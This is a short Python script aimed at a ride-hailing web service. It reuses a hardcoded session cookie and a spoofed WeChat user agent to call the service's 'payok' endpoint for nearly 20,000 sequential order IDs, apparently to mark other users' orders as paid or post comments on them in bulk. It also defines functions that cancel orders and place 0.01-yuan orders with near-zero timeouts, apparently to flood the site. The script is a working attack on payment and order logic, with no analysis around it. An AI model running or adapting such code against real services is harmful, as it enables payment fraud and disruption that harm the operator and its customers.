import requests
import json
import time

#327584
#64145



# 评论
def send(t):
    headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 MicroMessenger/6.6.5 NetType/WIFI Language/zh_CN'}
    cookies = dict(PHPSESSID='8gah7qc84q7k0eb4uug5j1t8a2')

    url = 'http://m.wesheeps.com/passenger/payok?order_id='+t+'&reason=%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BE%88%E5%A5%BD%EF%BC%8C%E8%AE%BE%E8%AE%A1%E7%AC%A6%E5%90%88http%E8%A7%84%E8%8C%83%EF%BC%8C%E5%A4%A7%E5%85%84%E5%BC%9F%E5%8A%A0%E6%B2%B9'
    try:
        req = requests.get(url,cookies=cookies,headers=headers)
        back=req.text
    except:
        back = 'error'
    return back

#取消
def order(old,new):
    obj={'departure':'周杰伦','terminal':'测试','appDate':'3018-03-20','appTime':'02:36','remarks':'1234','money':'0.01元','appMoney':'.01'}
    url='http://m.wesheeps.com/passenger/cencel_order_undri?order_id='+old+'&new_id='+new;
    cookies = dict(PHPSESSID='8gah7qc84q7k0eb4uug5j1t8a2')
    headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 MicroMessenger/6.6.5 NetType/WIFI Language/zh_CN'}
    try:
        req= requests.get(url,timeout=0.05,cookies=cookies,headers=headers)
        back=req.text
    except:
        back='error'
    return back

#下单
def xiadan(i):
    obj={'departure':'周杰伦'+i,'terminal':'测试','appDate':'2018-03-20','appTime':'02:36','remarks':'1234','money':'0.01元','appMoney':'.01'}
    url='http://m.wesheeps.com/passenger/release_input';
    cookies = dict(PHPSESSID='8gah7qc84q7k0eb4uug5j1t8a2')
    headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 MicroMessenger/6.6.5 NetType/WIFI Language/zh_CN'}
    try:
        req= requests.post(url,timeout=0.05,cookies=cookies,headers=headers,data=obj)
        back=req.text
    except:
        back='error'
    return back


for i in range(100, 20000):
    print(i)



    ww=send(str(327584+i));


    print(ww);
